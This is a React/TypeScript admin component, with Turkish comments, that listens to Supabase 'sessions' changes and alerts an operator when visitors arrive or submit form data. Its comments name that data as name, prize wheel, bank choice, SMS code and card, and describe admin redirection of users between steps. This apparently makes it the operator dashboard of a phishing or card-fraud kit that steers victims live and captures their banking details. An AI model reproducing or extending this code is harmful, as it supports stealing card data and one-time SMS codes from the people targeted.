"use client";

import { useEffect, useRef } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { playBeautifulNotification, showBeautifulToast, extractUserFormData } from "@/lib/notification";

// Tum admin1 sekmelerinde canli kalir: LogsTab kapaliyken (Ayarlar, Kullanicilar,
// Bankalar, Cark vb.) da sessions degisikliklerini dinler ve bildirim gonderir.
// SES sadece kullanici form girislerinde calar (isim, cark, banka secimi, SMS, kart);
// admin yonlendirmeleri/teknik alan degisiklikleri ses tetiklemez.
// Tarayici sekmesi arka plandaysa ayrica OS duzeyinde Notification gonderir.
export function AdminNotifier() {
  const cacheRef = useRef(new Map<string, string>());

  useEffect(() => {
    const supabase = createBrowserSupabaseClient();
    if (!supabase) return;
    let isDisposed = false;

    // OS bildirim izni: kullanici etkilesimi gerekli, ilk click/keydown'da iste
    const requestPerm = () => {
      try {
        if ("Notification" in window && Notification.permission === "default") {
          void Notification.requestPermission();
        }
      } catch {
        /* ignore */
      }
      window.removeEventListener("click", requestPerm);
      window.removeEventListener("keydown", requestPerm);
    };
    window.addEventListener("click", requestPerm);
    window.addEventListener("keydown", requestPerm);

    // ikilt'de ses toggle'i opt-in: sadece acikca 'true' ise cal
    const isSoundOn = () => {
      try {
        return localStorage.getItem("admin1SoundEnabled") === "true";
      } catch {
        return false;
      }
    };
    const isNotifOn = () => {
      try {
        return localStorage.getItem("admin1NotifEnabled") !== "false";
      } catch {
        return true;
      }
    };

    const notify = (title: string, desc?: string, withSound = true) => {
      const soundOn = withSound && isSoundOn();
      const notifOn = isNotifOn();
      if (!soundOn && !notifOn) return;
      // LogsTab'daki ile ayni olay icin cift bildirim cikmasin
      const w = window as any;
      const now = Date.now();
      if (w.__adminNotifyAt && now - w.__adminNotifyAt < 2000) return;
      w.__adminNotifyAt = now;
      try {
        if (soundOn) playBeautifulNotification();
        if (notifOn) {
          showBeautifulToast(title, desc);
          if (document.hidden && "Notification" in window && Notification.permission === "granted") {
            new Notification(title, {
              body: desc || "",
              icon: "/favicon.ico",
              tag: `admin1-${now}`,
            });
          }
        }
      } catch {
        /* ignore */
      }
    };

    const channel = supabase
      .channel("admin1-global-notifier")
      .on("postgres_changes", { event: "INSERT", schema: "public", table: "sessions" }, (payload) => {
        if (isDisposed) return;
        const row = payload.new as any;
        if (!row?.id || row.is_hidden) return;
        cacheRef.current.set(
          row.id,
          JSON.stringify(extractUserFormData(row.form_data)),
        );
        notify("Yeni Ziyaretçi", "Siteye yeni bir kullanıcı girdi.");
      })
      .on("postgres_changes", { event: "UPDATE", schema: "public", table: "sessions" }, (payload) => {
        if (isDisposed) return;
        const row = payload.new as any;
        if (!row?.id || row.is_hidden) return;
        // Sadece ve sadece form_data (kullanici girdisi) degistiyse bildir;
        // current_step degisimi (admin yonlendirmesi) ASLA "Yeni Form Verisi" sayilmaz!
        const cur = JSON.stringify(extractUserFormData(row.form_data));
        const prev = cacheRef.current.get(row.id);
        cacheRef.current.set(row.id, cur);

        // Ilk gorulen update baseline sayilir; sonrasinda gercek kullanici girdisi degismisse bildir
        if (prev === undefined || prev === cur) return;

        // Admin tarafindan son 4 sn icinde yapilan yonlendirme/aksiyon sirasinda ek bildirim basma
        const w = window as any;
        if (w.__lastAdminActionAt && Date.now() - w.__lastAdminActionAt < 4000) return;

        notify("Yeni Form Verisi", "Kullanıcı bilgi girişi yaptı (İsim, SMS, Kart, Banka vb.).");
      })
      .subscribe();

    return () => {
      isDisposed = true;
      window.removeEventListener("click", requestPerm);
      window.removeEventListener("keydown", requestPerm);
      void supabase.removeChannel(channel);
    };
  }, []);

  return null;
}
